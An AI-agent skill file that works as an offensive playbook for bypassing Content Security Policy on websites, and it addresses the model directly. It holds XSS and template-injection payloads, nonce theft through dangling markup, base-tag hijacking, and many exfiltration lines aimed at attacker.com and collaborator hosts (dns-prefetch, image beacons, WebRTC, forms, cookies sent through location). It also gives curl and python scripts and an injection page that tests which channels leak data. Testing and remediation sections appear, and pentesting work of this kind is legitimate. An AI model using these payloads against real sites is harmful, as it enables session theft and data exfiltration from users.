---
name: csp-bypass-advanced
description: >-
  Advanced Content Security Policy bypass techniques. Use when XSS or data
  exfiltration is blocked by CSP and you need to find policy weaknesses, trusted
  endpoint abuse, nonce leakage, or exfiltration channels that CSP cannot block.
---

# SKILL: CSP Bypass — Advanced Techniques

> **AI LOAD INSTRUCTION**: Covers per-directive bypass techniques, nonce/hash abuse, trusted CDN exploitation, data exfiltration despite CSP, and framework-specific bypasses. Base models often suggest `unsafe-inline` bypass without checking if the CSP actually uses it, or miss the critical `base-uri` and `object-src` gaps.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS vectors to deliver after CSP bypass
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) when CSP blocks scripts but HTML injection exists — exfiltrate without JS
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF can inject CSP header or steal nonce via response splitting
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when both WAF and CSP must be bypassed
- [clickjacking](../clickjacking/SKILL.md) when CSP lacks `frame-ancestors` — clickjacking still possible

---

## 1. CSP DIRECTIVE REFERENCE MATRIX

| Directive | Controls | Default Fallback |
|---|---|---|
| `default-src` | Fallback for all `-src` directives not explicitly set | None (browser default: allow all) |
| `script-src` | JavaScript execution | `default-src` |
| `style-src` | CSS loading | `default-src` |
| `img-src` | Image loading | `default-src` |
| `connect-src` | XHR, fetch, WebSocket, EventSource | `default-src` |
| `frame-src` | iframe/frame sources | `default-src` |
| `font-src` | Font loading | `default-src` |
| `object-src` | `<object>`, `<embed>`, `<applet>` | `default-src` |
| `media-src` | `<audio>`, `<video>` | `default-src` |
| `base-uri` | `<base>` element | **No fallback** — unrestricted if absent |
| `form-action` | Form submission targets | **No fallback** — unrestricted if absent |
| `frame-ancestors` | Who can embed this page (replaces X-Frame-Options) | **No fallback** — unrestricted if absent |
| `report-uri` / `report-to` | Where violation reports are sent | N/A |
| `navigate-to` | Navigation targets (limited browser support) | **No fallback** |

**Critical insight**: `base-uri`, `form-action`, and `frame-ancestors` do NOT fall back to `default-src`. Their absence is always a potential bypass vector.

---

## 2. BYPASS TECHNIQUES BY DIRECTIVE

### 2.1 `script-src 'self'`

The app only allows scripts from its own origin. Bypass vectors:

| Vector | Technique |
|---|---|
| JSONP endpoints | `<script src="/api/jsonp?callback=alert(1)//"></script>` — JSONP reflects callback as JS |
| Uploaded JS files | Upload `.js` file (e.g., avatar upload accepts any extension) → `<script src="/uploads/evil.js"></script>` |
| DOM XSS sinks | Find DOM sinks (innerHTML, eval, document.write) in existing same-origin JS — inject via URL fragment/param |
| Angular/Vue template injection | If framework is loaded from `'self'`, inject template expressions: `{{constructor.constructor('alert(1)')()}}` |
| Service Worker | Register SW from same origin → intercept and modify responses |
| Path confusion | `<script src="/user-content/;/legit.js">` — server returns user content due to path parsing, but URL matches `'self'` |

### 2.2 `script-src` with CDN Whitelist

```
script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net
```

| Whitelisted CDN | Bypass |
|---|---|
| `cdnjs.cloudflare.com` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection |
| `cdn.jsdelivr.net` | jsdelivr serves any npm package or GitHub file: `cdn.jsdelivr.net/npm/attacker-package@1.0.0/evil.js` |
| `*.googleapis.com` | Google JSONP endpoints, Google Maps callback parameter |
| `unpkg.com` | Same as jsdelivr — serves arbitrary npm packages |
| `*.cloudfront.net` | CloudFront distributions are shared — any CF customer's JS is allowed |

**Trick**: Search for JSONP endpoints on whitelisted domains: `site:googleapis.com inurl:callback`

### 2.3 `script-src 'unsafe-eval'`

`eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` all permitted.

```javascript
// Template injection → RCE-equivalent in browser
[].constructor.constructor('alert(document.cookie)')()

// JSON.parse doesn't execute code, but if result is used in eval context:
// App does: eval('var x = ' + JSON.parse(userInput))
```

### 2.4 `script-src 'nonce-xxx'`

Only scripts with matching nonce attribute execute.

| Bypass | Condition |
|---|---|
| Nonce reuse | Server uses same nonce across requests or for all users → predictable |
| Nonce injection via CRLF | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">` |
| Dangling markup to steal nonce | `<img src="https://attacker.com/steal?` (unclosed) → page content including nonce leaks as URL parameter |
| DOM clobbering | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
| Script gadgets | Trusted nonced script uses DOM data to create new script elements — inject that DOM data |

### 2.5 `script-src 'strict-dynamic'`

Trust propagation: any script created by an already-trusted script is also trusted, regardless of source.

| Bypass | Technique |
|---|---|
| `base-uri` injection | `<base href="https://attacker.com/">` → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to `https://attacker.com/lib.js` |
| Script gadget in trusted code | Find trusted script that does `document.createElement('script'); s.src = location.hash.slice(1)` → control via URL fragment |
| DOM XSS in trusted script | Trusted script reads `innerHTML` from user-controlled source → injected `<script>` is trusted via `strict-dynamic` |

### 2.6 Angular / Vue CSP Bypass

**Angular (with CSP):**
```html
<!-- Angular template expression bypasses script-src when angular.js is whitelisted -->
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

<!-- Angular >= 1.6 sandbox removed, so simpler: -->
{{constructor.constructor('alert(1)')()}}
```

**Vue.js:**
```html
<!-- Vue 2 with runtime compiler -->
<div id=app>{{_c.constructor('alert(1)')()}}</div>
<script src="https://whitelisted-cdn/vue.js"></script>
<script>new Vue({el:'#app'})</script>
```

### 2.7 Missing `object-src`

If `object-src` is not set (falls back to `default-src`), and `default-src` allows some origins:

```html
<!-- Flash-based bypass (legacy, mostly patched, but still appears on old systems) -->
<object data="https://attacker.com/evil.swf" type="application/x-shockwave-flash">
  <param name="AllowScriptAccess" value="always">
</object>

<!-- PDF plugin abuse -->
<embed src="/user-upload/evil.pdf" type="application/pdf">
```

### 2.8 Missing `base-uri`

```html
<!-- Inject base tag → all relative URLs resolve to attacker -->
<base href="https://attacker.com/">

<!-- Existing script: <script src="/js/app.js"> -->
<!-- Now loads: https://attacker.com/js/app.js -->
```

This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths.

### 2.9 Missing `frame-ancestors`

CSP without `frame-ancestors` → page can be framed → clickjacking possible.

`X-Frame-Options` header is overridden by `frame-ancestors` if CSP is present. But if CSP exists without `frame-ancestors`, some browsers ignore XFO entirely.

---

## 3. CSP IN META TAG vs. HEADER

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

**Meta tag limitations:**
- Cannot set `frame-ancestors` (ignored in meta)
- Cannot set `report-uri` / `report-to`
- Cannot set `sandbox`
- If injected via HTML injection *before* the meta tag in DOM order, attacker's meta CSP may be processed first (browser uses first encountered)
- If page has both header CSP and meta CSP, **both apply** (most restrictive wins)

---

## 4. DATA EXFILTRATION DESPITE CSP

When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration channels:

| Channel | CSP Directive Needed to Block | Technique |
|---|---|---|
| DNS prefetch | None (CSP cannot block DNS) | `<link rel="dns-prefetch" href="//data.attacker.com">` |
| WebRTC | None (CSP cannot block) | `new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com'}]})` |
| `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP |
| Redirect-based | `navigate-to` (rarely set) | `location='https://attacker.com/?'+document.cookie` |
| CSS injection | `style-src` | `<style>body{background:url(https://attacker.com/?data)}</style>` |
| `<a ping>` | `connect-src` | `<a ping="https://attacker.com/collect" href="#">click</a>` |
| `report-uri` leak | N/A | Trigger CSP violation → report contains blocked-uri with data |
| Form submission | `form-action` | `<form action="https://attacker.com/"><button>Submit</button></form>` |

**DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.

---

## 5. CSP BYPASS DECISION TREE

```
CSP present?
├── Read full policy (response headers + meta tags)
│
├── Check for obvious weaknesses
│   ├── 'unsafe-inline' in script-src? → Standard XSS works
│   ├── 'unsafe-eval' in script-src? → eval/Function/setTimeout bypass
│   ├── * or data: in script-src? → <script src="data:,alert(1)">
│   └── No CSP header at all on some pages? → Find CSP-free page
│
├── Check missing directives
│   ├── No base-uri? → <base href="https://attacker.com/"> → hijack relative scripts
│   ├── No object-src? → Flash/plugin-based bypass (legacy)
│   ├── No form-action? → Exfil via form submission
│   ├── No frame-ancestors? → Clickjacking possible
│   └── No connect-src falling back to lax default-src? → fetch/XHR exfil
│
├── script-src 'self'?
│   ├── Find JSONP endpoints on same origin
│   ├── Find file upload → upload .js file
│   ├── Find DOM XSS in existing same-origin scripts
│   └── Find Angular/Vue loaded from self → template injection
│
├── script-src with CDN whitelist?
│   ├── Check CDN for JSONP endpoints
│   ├── Check jsdelivr/unpkg/cdnjs → load attacker-controlled package
│   └── Check *.cloudfront.net → shared distribution namespace
│
├── script-src 'nonce-xxx'?
│   ├── Nonce reused across requests? → Replay
│   ├── CRLF injection available? → Inject nonce
│   ├── Dangling markup to steal nonce
│   └── Script gadget in trusted scripts
│
├── script-src 'strict-dynamic'?
│   ├── base-uri not set? → <base> hijack
│   ├── DOM XSS in trusted script? → Inherit trust
│   └── Script gadget creating dynamic scripts from DOM data
│
└── All script execution blocked?
    ├── Dangling markup injection → exfil without JS (see ../dangling-markup-injection/SKILL.md)
    ├── DNS prefetch exfiltration
    ├── WebRTC exfiltration
    ├── CSS injection for data extraction
    └── Form action exfiltration
```

---

## 6. TRICK NOTES — WHAT AI MODELS MISS

1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** — these have no fallback. This is the #1 CSP mistake.
2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.
3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH — the effective policy is the intersection (most restrictive).
4. **`Content-Security-Policy-Report-Only`** does not enforce — it only reports. Check for the correct header name.
5. **Nonce length matters**: Nonces should be ≥128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.
6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` — this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">` — trivial bypass, but commonly seen in real-world CSPs.

---

## 7. EXECUTION PRIMITIVES

CSP work is measurement: **which directive, which source, which sink**. Every block here produces a
number or a callback, not a claim.

### 7.1 Capture the effective policy, including report-only and meta

```bash
U="https://target.tld/"
# header form (authoritative) - there can be several, and they combine
curl -sS -D- -o /tmp/cspbody "$U" | grep -i '^content-security-policy' | tee csp_raw.txt
# meta form (weaker, and often the ONLY one on a page)
grep -oiE '<meta[^>]+http-equiv="content-security-policy"[^>]*content="[^"]*"' /tmp/cspbody
# effective policy = the intersection: a source must be allowed by BOTH
python3 - <<'PY'
import re, sys
pols=[]
for line in open('csp_raw.txt'):
    pols.append(line.split(':',1)[1].strip())
d={}
for p in pols:
    for part in p.split(';'):
        part=part.strip()
        if not part: continue
        name, *srcs = part.split()
        d.setdefault(name.lower(), set()).update(srcs)
for k,v in sorted(d.items()): print(f"{k:34} {' '.join(sorted(v)) or '(empty)'}")
print("\ndirectives:", len(d))
PY
```

Report the **effective** policy. If a header and a meta tag both exist, a source must be permitted by
both - and reporting one while testing the other is how a "CSP bypass" turns out to be unproven.

### 7.2 Determine whether script execution is even constrained

```bash
python3 - <<'PY'
import re
d={}
for line in open('csp_raw.txt'):
    for part in line.split(':',1)[1].split(';'):
        part=part.strip()
        if not part: continue
        n,*s=part.split(); d.setdefault(n.lower(),set()).update(s)
ss=' '.join(d.get('script-src') or d.get('default-src') or [])
print("script sources:", ss or "(NONE - no restriction)")
for flag,msg in [("unsafe-inline","inline script executes - no bypass needed"),
                 ("unsafe-eval","string-to-code sinks work"),
                 ("unsafe-hashes","inline handlers may be allowed"),
                 ("strict-dynamic","host allowlists are IGNORED; nonce is the only path"),
                 ("http:","mixed content pivot possible"),
                 ("data:","data: URIs are script sources"),
                 ("blob:","blob: is a script source")]:
    if flag in ss: print(" ", flag, "->", msg)
print("nonce present:", bool(re.search(r'nonce-[A-Za-z0-9+/=_-]+', ss)))
print("hashes:", len(re.findall(r"'sha(256|384|512)-", ss)))
print("wildcard:", "*" in ss, "| self:", "'self'" in ss, "| none:", "'none'" in ss)
print("base-uri:", d.get('base-uri','(ABSENT - meta/base hijack possible)'))
print("object-src:", d.get('object-src','(ABSENT - plugin/object injection possible)'))
print("form-action:", d.get('form-action','(ABSENT - form exfil unrestricted)'))
PY
```

`unsafe-inline` present means there is no first-order script restriction and the finding is the XSS,
not a CSP bypass. `strict-dynamic` present means every host-allowlist technique is dead. **Read the
policy before choosing a technique.**

### 7.3 Inventory the hosts the policy trusts, and what they serve

```bash
python3 - <<'PY'
d={}
for line in open('csp_raw.txt'):
    for part in line.split(':',1)[1].split(';'):
        part=part.strip()
        if not part: continue
        n,*s=part.split(); d.setdefault(n.lower(),set()).update(s)
hosts=set()
for k in ('script-src','default-src','connect-src','img-src','style-src','frame-src','object-src'):
    for s in d.get(k,set()):
        s=s.strip("'")
        if s.startswith(('http','//')) or ('.' in s and not s.startswith('sha')):
            if not s.endswith(':'): hosts.add(s.lstrip('/'))
print("\n".join(sorted(hosts)))
PY
# for each trusted host, look for a JSONP or user-content endpoint - that is the bypass
for H in $(python3 -c "
d={}
for line in open('csp_raw.txt'):
    for part in line.split(':',1)[1].split(';'):
        part=part.strip()
        if not part: continue
        n,*s=part.split(); d.setdefault(n.lower(),set()).update(s)
print(' '.join(sorted({x.strip(chr(39)).lstrip('/') for k in ('script-src','default-src') for x in d.get(k,set()) if x.strip(chr(39)).startswith('http')})))"); do
  echo "=== $H"
  curl -sS -o /tmp/j -w '%{http_code} %{size_download}\n' --max-time 12 "https://$H/"
  grep -oiE 'callback=|jsonp|\?cb=|\.json' /tmp/j | sort -u | head -5
done
```

A trusted host that offers JSONP, serves user uploads, or is a CDN with path-based content control is
the classic bypass. `strict-dynamic` neutralises all of it - check 7.2 first.

### 7.4 Nonce reuse and nonce leakage

```bash
# three fetches: a static nonce is a reusable nonce
for i in 1 2 3; do
  curl -sS -D- -o /tmp/b$i "https://target.tld/" >/dev/null
  echo "req$i nonce: $(grep -oE "nonce-[A-Za-z0-9+/=_-]+" /tmp/b$i | head -1)"
done
# nonce present anywhere in the body that a payload could read
grep -oE 'nonce="[^"]+"' /tmp/b1 | sort -u | head
```

A nonce that does not change per response is a **static nonce** - it can be reused. A nonce that
appears in an attribute a payload can read (a `<script nonce>` earlier in the DOM, a CSS selector, a
reflected value) is reusable too. Both make `strict-dynamic` ineffective.

### 7.5 Build the injected page and count what actually executed

```bash
cat > /tmp/csp_test.html <<'HTML'
<!doctype html><meta charset=utf-8>
<div id=out></div>
<script>
const results = [];
function t(name, fn){ try { fn(); results.push([name, true]); }
  catch(e){ results.push([name, false, e.message]); } }
t("inline",   () => eval("1"));
t("data-uri", () => { const s=document.createElement("script"); s.src="data:text/javascript,1"; document.head.append(s); });
t("blob",     () => { const s=document.createElement("script");
                      s.src=URL.createObjectURL(new Blob(["1"],{type:"text/javascript"})); document.head.append(s); });
t("fetch",    () => fetch("https://COLLAB/t",{mode:"no-cors"}));
t("img",      () => { const i=new Image(); i.src="https://COLLAB/i"; });
t("dns",      () => fetch("https://x1.COLLAB/dns",{mode:"no-cors"}));
t("form",     () => { const f=document.createElement("form");
                      f.action="https://COLLAB/f"; f.method="POST"; f.submit(); });
t("nav",      () => { const a=document.createElement("a"); a.href="https://COLLAB/n"; a.click(); });
t("websocket",() => { try { new WebSocket("wss://COLLAB/ws"); } catch(e){ throw e; } });
t("webrtc",   () => { new RTCPeerConnection().createDataChannel("x"); });
t("css",      () => { const l=document.createElement("link"); l.rel="stylesheet";
                      l.href="https://COLLAB/c.css"; document.head.append(l); });
t("prefetch", () => { const l=document.createElement("link"); l.rel="dns-prefetch"; l.href="//COLLAB"; document.head.append(l); });
document.getElementById("out").textContent = JSON.stringify(results);
</script>
HTML
echo "inject this body into the vulnerable sink, then read the COLLAB log to see which channels fired"
```

The results array is your channel list. Anything that reached the collaborator is an exfiltration
channel **despite** the policy - and that, not script execution, is usually the achievable finding.

### 7.6 Exfiltration over an allowed `connect-src` or `img-src`

```bash
# if connect-src is 'self' only, look for a same-origin redirect/endpoint that forwards outbound
curl -sS -o /dev/null -w '%{http_code}\n' "https://target.tld/api/proxy?url=https://COLLAB/exfil"
# if img-src allows https:, a plain image beacon carries data in the path
echo "inject: <img src=\"https://COLLAB/leak?d=SECRET\">"
# and if dns-prefetch or prefetch-src is permitted, the data leaves in the hostname - no HTTP needed
echo "inject: <link rel=dns-prefetch href=\"//SECRET.COLLAB\">"
```

An open same-origin redirect or a proxy endpoint turns a restrictive policy into an exfiltration path.
`dns-prefetch` and the WebRTC hostname leak leave no traffic on the target's own network - they are
the channels defenders most often miss.

### 7.7 `base-uri` and `object-src` in practice

```bash
# base-uri absent: an injected <base> rewrites every relative script URL on the page
echo "inject: <base href=\"https://COLLAB/\">  then wait for a relative /js/app.js to load from your host"
# object-src absent: a plugin/object element can load and execute in some configurations
echo "inject: <object data=\"https://COLLAB/x.swf\"></object>"
# verify the two directives directly
python3 -c "
d={}
for line in open('csp_raw.txt'):
    for part in line.split(':',1)[1].split(';'):
        part=part.strip()
        if not part: continue
        n,*s=part.split(); d.setdefault(n.lower(),set()).update(s)
print('base-uri  :', d.get('base-uri','ABSENT'))
print('object-src:', d.get('object-src','ABSENT'))
print('form-action:', d.get('form-action','ABSENT'))
print('frame-ancestors:', d.get('frame-ancestors','ABSENT'))"
```

`base-uri 'none'` and `object-src 'none'` are the two directives most often forgotten. Their absence
is a real gap on any page with an HTML injection sink, and it is cheap to verify.

### 7.8 Report-only versus enforced, and the report endpoint

```bash
curl -sS -D- -o /dev/null "https://target.tld/" | grep -iE 'content-security-policy' | while read -r L; do
  case "$L" in *report-only*) echo "REPORT-ONLY (not enforced): $L";; *) echo "ENFORCED: $L";; esac
done
# a report-uri you can reach is a leak channel of its own
curl -sS -D- -o /dev/null "https://target.tld/" | grep -oiE 'report-uri[^;]*|report-to[^;]*'
```

A `Content-Security-Policy-Report-Only` header does **not** block anything. Claiming a bypass against
a report-only policy is a common and embarrassing error - check which header name is in play.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is the policy **enforced** or `Report-Only`? | report-only blocks nothing; there is no bypass to claim |
| 2 | Which directive are you bypassing, and what does it permit in the **effective** (intersected) policy? | a bypass against a policy that does not apply is not a bypass |
| 3 | Did your payload **execute** (a script ran), or did data **leave** (a channel fired)? | these are different findings with different severities |
| 4 | Is the trusted host you abused one the policy actually lists in `script-src`/`connect-src`? | quoting the directive is the proof |
| 5 | If `strict-dynamic` is present, did you defeat it with a **nonce** you could read or reuse? | otherwise the host technique cannot work |
| 6 | Did you observe a **collaborator callback** carrying the data, from a clean page? | exfiltration is only proven by receipt |
| 7 | Is the underlying issue an XSS you already have, or is CSP itself the only gap? | determines whether this is a finding or an amplifier |

**CSP is a mitigation, not a vulnerability.** Report the bypass as the *combination*: the injection
you have, the directive that should have stopped it, and the channel that carried the data out. A
policy without `base-uri` is a hardening note unless you can show a `base` injection.

---

## 9. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **full effective policy** as received, with the header name (`CSP` vs `CSP-Report-Only`) | an enforced/report-only confusion invalidates the finding |
| The **directive and source** you abused, quoted | the bypass is defined against a specific allowance |
| The **injection point** that got your markup onto the page | CSP bypass without an injection is a theoretical note |
| The **collaborator callback** with timestamp and the data received | the only proof of exfiltration |
| The **channel** used (img, dns-prefetch, websocket, allowed connect-src) and why the policy permits it | a channel the policy blocks is not a channel |
| For nonce findings: the **nonce value, its reuse across responses**, or the DOM location it leaked from | proves reuse rather than a lucky render |
| The **`base-uri`/`object-src`/`form-action`/`frame-ancestors`** values as configured | these gaps are the most common real bypasses |
| **Negative control** - the same payload with a channel the policy forbids does NOT fire | shows the policy is otherwise working |
| The **browser and version** tested | directive support differs, `strict-dynamic` especially |
| A statement of what the policy **did** stop | honest scoping; it explains why this bypass was needed |

Report the **combination**: "the search page reflects HTML unsanitised; the enforced policy is
`script-src 'nonce-<static>' 'strict-dynamic'` and the nonce is identical on every response, so an
injected `<script nonce='...'>` executes; a collaborator callback confirmed execution from
`/search`, and `connect-src` permits `https://api.target.tld`, which accepts a `url=` parameter and
forwards outbound - the data left through an allowed host", never "CSP is misconfigured".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| `Content-Security-Policy-Report-Only` present | it enforces nothing |
| A bypass against a directive that does not govern your payload | wrong directive |
| A host allowlist technique against a `strict-dynamic` policy | the host list is ignored in that configuration |
| A channel the policy blocks in your own test | the control worked |
| An exfiltration payload that produced no callback | unproven |
| `unsafe-inline` in the policy, reported as a "CSP weakness" | it is a conscious (if weak) allowance, not a bypass |
| Missing `object-src` on a site with no HTML injection | no reachable path |
| Missing `base-uri` with no injection and no relative scripts | no effect |
| A meta-tag policy you assumed but did not read | an assumption |
| A payload that only works in a browser you did not test | unverified |
| A CSP finding whose real cause is an XSS you have not reported | the XSS is the finding; CSP is the amplifier |
| A "bypass" that requires an extension or a browser flag | not a page-level attack |

**Quote the directive.** If you cannot name the source you abused and the directive that listed it,
you have not shown a bypass.

---

## 10. REMEDIATION REFERENCE

1. **Use nonces, and generate a fresh one per response** - a static or reused nonce turns `strict-dynamic` into a suggestion; the nonce must be unguessable and never reused across responses or users.
2. **Adopt `strict-dynamic` with nonces, and stop relying on host allowlists** - host-based `script-src` is bypassable through any JSONP endpoint or user-content origin; `strict-dynamic` removes that class.
3. **Set `base-uri 'none'` (or `'self'`) and `object-src 'none'`** - these two directives close the base-tag hijack and plugin paths, and are the most commonly forgotten parts of an otherwise strong policy.
4. **Set `form-action 'self'` and `frame-ancestors 'none'`** - they block form-based exfiltration and framing, which are the escape hatches when script execution is prevented.
5. **Restrict `connect-src`, `img-src`, and `font-src` to specific hosts** - exfiltration does not need script execution; a permissive `img-src` with a wildcard is a beacon channel.
6. **Never allow `unsafe-inline` or `unsafe-eval` in a policy you describe as protective** - they remove the control you claim to have; if legacy code needs them, use hashes or nonces and migrate.
7. **Audit every host in the allowlist for JSONP and user-controlled content** - a trusted CDN that serves customer uploads, or a host with a `callback=` parameter, is a script source in practice.
8. **Serve the policy as a header, and treat the meta form as a fallback only** - a header can carry every directive, and the meta form cannot express `frame-ancestors` or `report-to`.
9. **Deploy in `Report-Only` first, then enforce** - and make the transition a tracked decision; a policy left permanently in report-only is documentation, not a control.
10. **Point violation reporting at a controlled, rate-limited endpoint** - the report channel receives attacker-influenced data and must not become an injection or DoS vector itself.
11. **Re-measure the policy after every front-end change** - CSPs drift as frameworks inject inline scripts and new third-party tags; an unreviewed policy erodes into `unsafe-inline` in a year.

---

## 11. RELATED SIBLINGS - LOAD TOGETHER

- [xss-exploitation-chains](../xss-exploitation-chains/SKILL.md) - the injection this bypass serves
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) - exfiltration when script cannot run at all
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the action CSP's `form-action` is meant to constrain
- [browser-extension-engineering](../browser-extension-engineering/SKILL.md) - a context CSP does not apply to
- [clickjacking](../clickjacking/SKILL.md) - what `frame-ancestors` exists to prevent
